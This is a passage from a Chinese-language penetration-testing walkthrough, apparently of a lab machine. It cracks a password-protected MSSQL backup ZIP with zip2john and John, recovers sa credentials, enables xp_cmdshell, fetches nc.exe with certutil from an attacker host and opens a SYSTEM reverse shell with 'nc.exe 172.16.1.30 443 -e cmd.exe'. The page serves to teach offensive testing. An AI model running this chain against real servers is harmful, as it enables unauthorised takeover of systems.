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" width="524" height="74" class="img_ev3q"></p>
<p>当尝试将其解压时，我们发现它受到了密码保护...</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250307161834638-54933728-496221144bac76054421c0b738ab3210.png" width="469" height="142" class="img_ev3q"></p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="42破解-zip-文件密码"><strong><div id="id4.2">4.2、破解 ZIP 文件密码</div></strong><a href="#42破解-zip-文件密码" class="hash-link" aria-label="42破解-zip-文件密码的直接链接" title="42破解-zip-文件密码的直接链接">​</a></h4>
<p>对于大多数受密码保护的文件类型，John the Ripper 通常都可以通过配套工具将受保护文件转换为可破解的格式。而这些配套工具的命名格式都是 xxx2john 这样的，因此可以使用以下命令找到它们：</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">locate *2john</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250307161835102-1258633683-24d8138297b126bf1c4d19f75fc290ce.png" width="366" height="639" class="img_ev3q"></p>
<p>从上面可以看出，John 能够破解很多文件类型，其中就包括 ZIP 文件格式。</p>
<p>于是，就可以使用以下命令将 ZIP 文件转换为可破解的格式：</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">zip2john MSSQL_Backup.zip &gt; john_zip</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>将输出重定向到文件后，现在可以尝试使用 John 来破解密码。</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">john john_zip --wordlist=/usr/share/wordlists/rockyou.txt</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250307161835034-363115122-4c2c414431e21d9329cabb3fbf0385fa.png" width="763" height="180" class="img_ev3q"></p>
<p>John 几乎很快就破解了密码，现在我们可以使用这个密码来解压文件。</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">unzip MSSQL_Backup.zip</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>现在，当系统提示输入密码时，我们输入 superuser，它会从 ZIP 中提取文件。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250307161835141-2098651737-ba77227917ba3fed6f391920d9e18f6b.png" width="424" height="139" class="img_ev3q"></p>
<p>ZIP 内部只有一个 TXT 文件，读取文件的内容，发现了 sa 用户的凭证！</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250307161836077-1766257845-9f82437196463cdc789815232d1a17fd.png" width="706" height="124" class="img_ev3q"></p>
<p><strong>sa : VeryComplexP@ssw0rd</strong></p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="43使用-xp_cmdshell-获取-system-shell"><strong><div id="id4.3">4.3、使用 xp_cmdshell 获取 SYSTEM Shell</div></strong><a href="#43使用-xp_cmdshell-获取-system-shell" class="hash-link" aria-label="43使用-xp_cmdshell-获取-system-shell的直接链接" title="43使用-xp_cmdshell-获取-system-shell的直接链接">​</a></h4>
<p>在 MSSQL 服务器上测试这个凭据，发现可以正常登录数据库！</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250307161835276-847200646-7bada17807831e0d8b93e93c92b0c82c.png" width="564" height="128" class="img_ev3q"></p>
<p>当我们可以使用特权帐户访问数据库时，就可以使用称为 xp_cmdshell 的内置工具 ，它允许我们以运行 MSSQL 服务的帐户身份执行命令。之前，我们看到该服务是以 MSSQL$SQLEXPRESS 服务账户的身份在运行。但是在本例中，我们幸运地发现 MSSQL 服务实际上是以 SYSTEM 账户运行的。</p>
<blockquote>
<p>注：以 SYSTEM 账户运行 MSSQL 服务也算是比较常见的情况吧。</p>
</blockquote>
<p>默认情况下，xp_cmdshell 功能是被禁用的，于是当我们尝试运行以下命令时将不起作用。</p>
<div class="language-mssql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-mssql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">xp_cmdshell &#x27;whoami&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">go</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250307161835873-1311238578-0ad25dfc676f2cb9c2fe21dbaaae0827.png" width="1024" height="124" class="img_ev3q"></p>
<p>但由于我们是 sa 超级账户，拥有对 MSSQL 服务器的完全控制权限，因此只需使用以下命令即可启用 xp_cmdshell 功能：</p>
<div class="language-mssql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-mssql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">EXEC SP_CONFIGURE &#x27;show advanced options&#x27;, 1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">reconfigure</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">go</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">EXEC SP_CONFIGURE &#x27;xp_cmdshell&#x27; , 1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">reconfigure</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">go</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250307161835807-1726304764-25d132c1e1043a6b12b3ba0e652e7061.png" width="877" height="175" class="img_ev3q"></p>
<blockquote>
<p>注：此时使用 mssqlclient 工具会更方便一些，只需要一条 enable_xp_cmdshell 命令便可开启 xp_cmdshell 功能。</p>
</blockquote>
<p>现在，当我们再次尝试 whoami 命令时，可以看到命令的执行结果。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250307161835530-1261323353-ae7f7608abe1818dd62cf0c3436f199d.png" width="616" height="374" class="img_ev3q"></p>
<blockquote>
<p>无论何时进入 MSSQL 服务器，首先要检查的就是是否可以执行命令或打开 xp_cmdshell，即便你的账户不是 sa。</p>
</blockquote>
<p>在确认当前身份是 SYSTEM 之后，我们距离完整 shell 也就几步之遥了。</p>
<p>接下来，我们将通过 MSSQL 服务器将 nc.exe 转移到受害者身上，然后以 SYSTEM 身份执行该文件。</p>
<p>首先，我们需要开启 HTTP 服务器并托管 nc.exe。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250307161835756-1145590104-0e3b80336d7b0294ffb07ade9dbfb735.png" width="463" height="143" class="img_ev3q"></p>
<p>接着，创建一个 <code>C:\temp</code> 文件夹，然后下载并确认 nc.exe。</p>
<div class="language-mssql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-mssql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">xp_cmdshell &#x27;mkdir C:\temp&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">go</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">xp_cmdshell &#x27;certutil -split -urlcache -f http://172.16.1.30/nc.exe C:\temp\nc.exe&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">go</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">xp_cmdshell &#x27;dir C:\temp&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">go</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250307161836461-193806524-bba3101f5fc2b4931e60f92459377bde.png" width="447" height="627" class="img_ev3q"></p>
<p>最后，就是在攻击者机器上启动一个 443 端口的 netcat 监听器，然后使用 nc.exe 将 shell 推送到我们的监听器上。</p>
<div class="language-mssql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-mssql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">xp_cmdshell &#x27;C:\temp\nc.exe 172.16.1.30 443 -e cmd.exe&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">go</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAegAAAA+CAIAAABvIh/dAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAASdEVYdFNvZnR3YXJlAEdyZWVuc2hvdF5VCAUAABZkSURBVHhe7Z15VBTXnsfz9+RlXowgsjYN0iyCaHBhcUGjGJWISx64K7iAou8RXKLRqChocItBZVEM+yKLgmwCzSKyNEtXszfdtGfmTM7MyzlvJpm8k1ky/7y51dVLdS3dVXSzPX/nfP7hV7fu/d17f/dbv7rdfXnvrbKfgYG72+a+P8fKer4NgW3AmVIlfkmGld7LqO1UkQsbZaTiXIiblZXVXGtrG6HPmsN3nw8Tl/pLb+31d3eyd3YWrT6YVD9gcBcAAADABotwW4qxviFZj1rx+9/KJR1FJ4JsAxJaMIMyAAAAAB8mV7hVfclbnVZfE/eo/8Sw8lNBdsHfvAHhBgAAmDiTnHEru2oSdwS6C4RCZ1cXoZf/lvgnr8aoZQAAAAAeTLZwAwAAABYGhBsAAGCWAcL994BKVpn9tGRQQbVPNtPVLgC847wLwi3ryYjedbVIQbWTkdbe2POntMZxqp0ZZd35jV4iD3cH6zlBSW36z1rZ7Kboydgxd27orSGqnSuqvpRdbgFXxFP9qe90tQtMNXJM890wCmz22QQXfbAs5q53hDHhHm1NPx/qbj03NH2YemlWgbVdDbAJuzdCtZPpfRpuG3DhJb8oxJJDrZkEms3OSl/+QUf7XalyA6NUUnB+/xoPp3lzrW0XBEWcKXwjJV2lIK0/t9RjX+oA1Y6jrE2KOf2wa4xqtwTG2p0tMMW55PFuF4GTA4GTzYcfrbsqwV8sepoeHd3i6+xoZ+PoGRR1r8JoUGlgWUdYV+4X25eL3FxdPFbsy+gwHS181mO3+GF0WOAiH3dnV6+gyNvlmh9PIOSN2afW+bg4Cl08Nxx/2C7X3WKE7sJI741J9bS0hm5nb3fmwkUfLAvjeucHm3BjzXe3+br57T2x1ceKHCjS1odxV3LrzWlyypn5wi2tiPX0OJJNeubLZLkHfJxWnEirkMllCqy6IPlmWZ9Mc1Vekbzdb3nY5fpRXXmU/N4Pdwu4ypT8yjO22S37QsxpifLGSLuzAbY4J6FofxLusvLrKjw2+vMv7jp0v7ZjXIlJnx0PmL/ky1rjHWetX1HzReCC4MsVqCrZSHerqe0mDn6SUbTkXYpLa5ColLKh2kubBKLjz3rVl7DO5PWOi6OKezEVlrpPaP1JYp3Jt0xVd3KY88rEVmpPGeys7c5kpl646eudN6wZ96i4sFoiVYrPBVqTA6WvIyduq5fjou1nCto4TImiozDKU7ApsR2le4rWJxGuXgfSMDxGkVDabz6TGL3Ox93RRrh8d4q4j3ovld6WtOgti53sbe1cfdZE3S5FsS7P2O6++eCRYPcFoqCTV2M3LxIu+PjA9924wKn68q+G+QodHUW+6/eHellrJ2a888m5z5a4419PdPFZ/XlCyWv1r0Bx4V4edTH+s2W+7o5OnhuvvSS+e45Usqng7GY/Fzt7e6F/xOUqTKueCIsJt0xWnZpZSXiiRl55cYX1moRa5geJLCXC7nf/aLs1HSPbpa/O+HnsTzdIfkfzTweKPARWv//I1s1d5OG1/lqD1iumfrGPp5H5YmoXL2+3/uSlmJ2bw0L8vHxI48k0j6QbaTCOP2tcGZ0vJljiXM9488Vgl9BHPbR65C/OL7UKeyCh2g1hqb8n/4CL3xfEr5E5YdJPVhTiG2utPr2ljq6xhqRgq08SG9HTQpoWvn6Fj03gl60mXsWw5q/9hdvvaobXtF0Lud0JwHMeLaUPrFgyDmnrnT8m9riZA2WoLufsJm+B986LmZ0jhpfoYFkxi4Q7HjRh2XsW+hwo0nQALWzrecuispD6y8Xp4S72od/0Gl3Aw8+ifBwC4vPFY0psqCkzo7gRBT3KJW099+Z295ZGuzmsv9Q02HhjrW3EY/RE6cje5yIMvdY02K/Eym6EOmonRvrihLtD6E0Jnn5KsZrHZa3E/gPuj7XvnkeNKFmQFEW6Oe0mXmSw1uurhf7RxV3StyP16bs9Fh7J0r/9WUy4qagk10Os/L7SiSwV2VBLcWUz9eABVe+3f3ALSqAlv0wZN3O/2MfT2HwxtYuXtw2MLelBxt6So7rxZJ5H0o0U2MefOa6Mzhc77ILYUxbtufBYzijVjhxIiXBaGFdhZP9KD7V+eflZP6fwywmHVnu6CIR+W2JzuP0qjb9wS6WlcWu9tqQQ9Y9kRroIowr63o4Un/50//c5R70dw7ONL+HhvBMLRUcKelRY9vXT37XpVJ7NrsGwXd7wnkcL6QMbUxSH3JmQcKsZbUn9cotIuPZSs6l38OGSaD/R8iDvxSefdWmNaGHrtybG8ve6OEbkGgug7u8j7Nwin1K2aNDEOGxMlCqk1XGLfE8VK5Xt9zdbb3vY/XYoda+DMx6geDHyqxD2OnG1nduGsw/yXmPkJUf2By8/L/Q2/tEBnlXZbHvQQRRTVp/y84ws1W1QTJpwK8VnA6yCv+kkP6W5IK09/bHnwceDhnYG4WbpF+t4mpgveruG43nZXzOeLPPIitHxZ4gr4/PFDlucq7pvb3P2v8ywEdTzMt7PLfRmp4l0VQO1/tGsI65zhOtic1q7x0fE+cd8HUOudXCoipdwq3ru7fO0s57vu/92uea1ZvhhhK0otqy389ZnYYl1YzV/9EO1DRncZYhMlrZNuDTulbx/vOnLVT5HX2gGk82Ow9AuK9jYgGSov0uLZGRUHfO859FS+sDCVMUhdyYs3FJJ8Ve7ljgujLhjOuCGi+N8P/i956ES/UlSBkKgrIz1tdr8yMg5U2ONScFzAy6o9xlJsE2Mqvv6Rqsl518R681wYhQd9WlnjoYFeDk5+YXFFXYSZejCrf7MF2UoznME3ksD/JfhLPP28D6YrxOsycu4cf+NZNwoMnrlTM9LtGZ2ugVdazK4kUG4WfrFUbjp80Vrl2U8WeaRFePjT48r4+XZYYlzTPzVcmHYbSlVfaTtD3csWnIgR/3SzQWacBec9FpwtEiTOiirT348P+yxMQHVwEu4CRSSvDOrnNcn1uBjjsZHKIx6khETcqQUJZvlx0xk3GP1N9bZh9zEv22FnPTz1go0m52EQbtsyIvPrLC3t7PV4rghoQbfc+c7jxbUB0amKg65MxHhVnbmJu5a7CxaF5dexSH/76mKX+q54/zXWwRLjudokzIDIZDn7BYK9xYa65jk8c75oqgsys/lWYVmMCXcVnSilFgYLBMzWH1jo61w/2P1U5pFaOTPz/nZ7kztNLhRx6QJ91v5y4v+84KvsXxwNJR7ynuOlVcU6UGoQ1obvwQlv+r0VoM8Y7s9NeNm7hdH4WaaL0q7LOPJMo9aMJk4r7zxjb7XxsafKa6Mzxc7zII48DTKXRRdrNudJ5C2PQr3WxKe/pq+SULzXwu1fkXz7Q3zQ++9ITa7lM+PeTuF5+jHk3M9GljLq8Fenfadt/UuvlTxPe65PsuCPr/XpFLKsHshtsb3uGXf7hI6LPDw8Pby8HabP+fD+SLfiPQ+Gavd4HZSu3zhPY+W1Ydpi0Pu8BXu3sZ74csELp/E3hP3c0o3hkuj0Svlo05svPX6JifPowUd6mBFC3ue08YLL3ulqqHqO58JFuxLM/6VsoGcPR4OQafzGkbGpP3iJ+kF9UgUWCdG0ZLymb3v8Tw8aIarkjc7aPewumpSEjJrX48p+lUDVaaFG+VclwMEKw7nvEarV4pVp+bXk5bxUOoeB8+YYvR+1Ds8QFrGbHYeyGQ5B3wE/rFpL7BR2fhAfWnymfvVSEDVV4eyj3t++JHHwWKmdxRV990dbqsSm/WPDUXZkYXOW9Mk2FtFd6+kSz3+zP0yKtwm5suwXbbxZJ5Hoobx9mshVu9/YLUySf9FBdbxZ4kro/PFDpMgyiS3NzgFnm0yeLPpabqz1S8wKlfzomYAk/8aaPVj7TfXCoPiXmKyt/Kmp/vcPfan92vzej714NDLq3pzE09fLWmTIOmRt6UeXWy79lo1MRcdyZ/Y2oem9cpUWEH8Cnsu3yohUJQe9l7IlFmT7Ozt8oX3PFpIH3CmMQ65wybcMuzBdnehwEVgPeeDOfZCwYJlMWX43PA7j1uFZcX4CMK+JX7YgrUmrrH32JOHP5nRwrbx2rjzUx9H9Ia0aHPcM/qn9lQkDd8e2uDjYGM9f4HvmkM3iwfwT43ZhKZf2fYwdu0iv5WfhIaGn4kMmk9MjOJN5Y39GxY52tk5ubkvXB1+rgTJGV45q9C8lTfmxm9e5mrrIHBdFBR2Pq+JFOi9jcnb/Zzm2doLg04Xkp72bHZeSLvyz+1b7e5oPcd6vsvy0Jh0zSGLaka7h0fYRkxa88Vir8hMbfKL8qymvFPBno62TgLX5ZEpmg8VmfplVLhNzhe5XfbxZJpHTQ3Y09glNna+h/LJuRuTn+xxZXy+6LDFOb4bkBziuu27VoNQZz2nXg2D/+z1yxu+jw32ETq6uIiC9ibUyEhd5lUPY3l5c8nl8DWeDvaOjkKPFREXs3p0abW8MevUWtSu0Nl9fcyDN0wbbowoy4/6MAm3gd1Iu3zhN48IS+gDwTTEIW9MZNyTBnlhAxZGJbm9zW3NDVq+Zgac5msS2p1WFNi4ic/WAGB6mFnCLc8Md7aaa22AbXiahd8y3gGkksYqGedkigMcH7QWbxcAAAamS7ildfdO3ihp47jlAkw3MF8AMIOYLuEGAAAAJggINwAAwCwDhBsAAGCWAcINAAAwy2AT7omcOwwAAABMASzCzXrusBnncY/1